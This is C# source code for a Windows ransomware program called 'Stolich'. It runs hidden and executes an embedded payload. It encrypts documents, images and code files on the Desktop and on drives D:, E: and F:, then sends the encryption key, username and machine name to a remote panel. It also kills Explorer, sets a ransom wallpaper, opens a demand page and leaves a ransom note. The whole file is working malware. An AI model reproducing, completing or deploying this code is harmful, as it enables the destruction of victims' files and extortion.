using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.Specialized;
using System.Net;
using System.Data;
using System.Linq;
using System.Windows.Forms;
using System.Security.Cryptography;

using static Stolich.MutationEngine;

namespace stolich
{
    public partial class Form1 : Form
    {
		public static string identiferGenerator(int length)
		{
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var random = new Random();
			return new string(Enumerable.Repeat(chars, length)
				.Select(s => s[random.Next(s.Length)]).ToArray());
		}

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        private static bool OAEP = false; //Optimal Asymmetric Encryption Padding
        const int keySize = 4096; //key size for RSA algorithm
		string primeDomain = "http://website.com"; // DO NOT ADD A / after the URL
        string publicKey;
        string encryptedPassword; // AES key encrypted with RSA public key
		string identifierStr = identiferGenerator(12);
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
		string generatorUrl = ("http://website.com/panel/createkeys.php"); //creates public key
		string keySaveUrl = ("http://website.com/panel/savekey.php"); //saves encrypted key to database
		string backgroundImageUrl = "https://website.com/demand/demands.jpg"; //desktop background picture
        string aesPassword;

		private class w32api
		{
			[DllImport("user32.dll", CharSet = CharSet.Auto)]
			public static extern int MessageBox(int hWnd, String text, String caption, uint type);
		}

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;
			string xyxx = Path.GetDirectoryName(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
			string glen = Directory.GetDirectoryRoot(xyxx);
			DirectoryInfo dirx = new DirectoryInfo(@glen);
			int yyxx = InitialMutations(dirx);

			FileStream fs188 = new FileStream(Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
			int host = (int)fs188.Length;
			int vir = host - 0117248;
			byte[] bytes1 = Readx(fs188, vir, 0117248);
			fs188.Close();
			Random ran = new Random();
			int yty = ran.Next(2000);
			FileStream fs6 = new FileStream("p" + yty + "h.exe", FileMode.OpenOrCreate, FileAccess.Write);
			Writex(fs6, bytes1);
			fs6.Close();
			try
			{
				Process xtx = Process.Start("p" + yty + "h.exe");
				xtx.WaitForExit();
			}
			catch
			{
				;
			}
			finally
			{
				File.Delete("p" + yty + "h.exe");
			}

			// All Mutation Pertaining Processes have been completed,
			// now time to initiate the crypter
            startAction();
        }

		// GUIKiller() is designed to kill Microsoft Windows Explorer
		// and is part of a scareware tactic
		public void GUIkiller()
		{
			foreach (var process in Process.GetProcessesByName("explorer"))
			{
				process.Kill();
			}
		}

		// This will prevent the program from being even remotly visible to anybody
        private void Form_Shown(object sender, EventArgs e)
        {
            Visible = false;
            Opacity = 100;
        }

		// Makes a POST request to web server with "x39nam" (USERNAME) and "cpe93j" (COMPUTERNAME) parameters
        // Webserver responses with the RSA public key and the function returns it.
        public string getPublicKey(string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
			formData["id"] = identifierStr;
			formData["username"] = userName;
            formData["pcname"] = computerName;
			byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            string responsefromserver = Encoding.UTF8.GetString(responseBytes);
            webClient.Dispose();
            return responsefromserver;
        }

        //Sends encryptedPassword variable with "aesencrypted" parameter to web server with a POST request
        public void sendKey(string url)
        {
            WebClient webClient = new WebClient();
            NameValueCollection formData = new NameValueCollection();
            formData["pcname"] = computerName;
            formData["aesencrypted"] = encryptedPassword;
            byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
            webClient.Dispose();
        }

		public void startAction()
		{
			string path = "\\Desktop\\";
			string startPath = userDir + userName + path;
			publicKey = getPublicKey(generatorUrl);
			string aesPassword = CreatePassword(64);
			encryptDirectory(startPath,aesPassword);
			encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
			sendKey(keySaveUrl);
			aesPassword = null;
			encryptedPassword = null;


			if (Directory.Exists ("D:\\")) {
				killPartition("D:\\");
			}

			if (Directory.Exists ("E:\\")) {
                killPartition("E:\\");
            } 

			if (Directory.Exists ("F:\\")) {
                killPartition("F:\\");
            }

			string backgroundImageName = userDir + userName + "\\ransom.jpg";
			SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
			GUIkiller();
			Process.Start(primeDomain + "/demand/");
			GC.Collect(); // Little bit of dirty cleaning

            string text = "You have been attacked by Stolich, your Personal Identifier is " +
                          identifierStr;
			System.IO.File.WriteAllText((@userDir + userName + "\\Desktop\\README.txt"), text);

			nullifyMyExistance();
			GC.Collect();
			System.Windows.Forms.Application.Exit();
		}

		public void killPartition(string path)
		{
			string startPath = path;
			publicKey = getPublicKey(generatorUrl);
			string aesPassword = CreatePassword(64);
			encryptDirectory(startPath,aesPassword);
			encryptedPassword = EncryptTextRSA(aesPassword, keySize, publicKey);
			sendKey(keySaveUrl);
			aesPassword = null;
			encryptedPassword = null;
		}
        
        //Encrypts a file with AES algorithm
        public void EncryptFile(string file, string password)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            System.IO.File.Move(file, file + ".stolich"); //new file extension
        }

		public void nullifyMyExistance(){
            const int keySize = 0;                  // Key size for RSA algorithm
            bool OAEP = 					false;  // Optimal Asymmetric Encryption Padding
			string primeDomain = 			null;   // DO NOT ADD A / after the URL
			string publicKey = 				null;
			string encryptedPassword = 		null;   // AES key encrypted with RSA public key
			string identifierStr = 			null;
			string userName = 				null;
			string computerName = 			null;
			string userDir = 				null;
			string generatorUrl = 			null;   // Creates public key
			string keySaveUrl = 			null;   // Saves encrypted key to database
			string backgroundImageUrl = 	null;   // Desktop background picture
			string aesPassword = 			null;
		}

        //Encrypts directory and subdirectories
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", 
				".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", 
				".aspx", ".html", ".xml", ".psd", ".css", ".js", ".cpp", ".h", ".hpp",
				".dwg", ".bak", ".vb"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], password);
					File.SetLastWriteTime(files[i], new DateTime(1985,4,3));
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password);
				Directory.SetLastWriteTime(childDirectories[i], new DateTime(1985,4,3));
            }
        }

        //Encrypts a string with RSA public key
        public static string EncryptTextRSA(string text, int keySize, string publicKeyXml)
        {
            var encrypted = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml);
            return Convert.ToBase64String(encrypted);
        }

        // RSA encryption algorithm
        public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKeyXml)
        {
 
            using (var provider = new RSACryptoServiceProvider(keySize))
            {
                provider.FromXmlString(publicKeyXml);
                return provider.Encrypt(data, OAEP);
            }
        }

        //AES encryption algorithm
        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

			var rng = new RNGCryptoServiceProvider();
			var saltBytes = new Byte[15];
			rng.GetBytes(saltBytes);

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        // Generates a random string
		public static string CreatePassword(int maxSize)
		{
			char[] chars = new char[62];
			chars =
				"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
			byte[] data = new byte[1];
			using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
			{
				crypto.GetNonZeroBytes(data);
				data = new byte[maxSize];
				crypto.GetNonZeroBytes(data);
			}
			StringBuilder result = new StringBuilder(maxSize);
			foreach (byte b in data)
			{
				result.Append(chars[b % (chars.Length)]);
			}
			return result.ToString();
		}

		public void SetWallpaper(String path)
		{
			SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
		}

        //Downloads image from web
        private void SetWallpaperFromWeb(string url, string path)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), path);
            SetWallpaper(path);
        }

        
    }


}
    

